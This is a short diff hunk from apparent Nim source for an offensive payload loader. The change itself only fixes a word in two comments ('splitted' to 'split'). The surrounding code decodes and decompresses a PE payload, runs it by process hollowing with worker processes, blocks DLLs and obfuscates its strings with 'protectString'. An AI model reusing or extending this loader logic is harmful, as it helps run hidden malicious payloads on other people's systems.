@@ -51,11 +51,11 @@ proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls
     else:
         peStr = uncompress(decodedPayload)
 
-    # Check hollow splitted args 
+    # Check hollow split args 
     when defined(hollow4) or defined(hollow5) or defined(hollow6):
         for i in commandLineParams:
             if i.startsWith(protectString("-A:")) or i.startsWith(protectString("-W:")) or i.startsWith(protectString("-T:")) or i.startsWith(protectString("-R:")):
-                # This is a worker process in splitted hollow, let it go
+                # This is a worker process in split hollow, let it go
                 return hollow456Worker(peStr)
         if not (protectString("-M") in commandLineParams):
             quit(1)
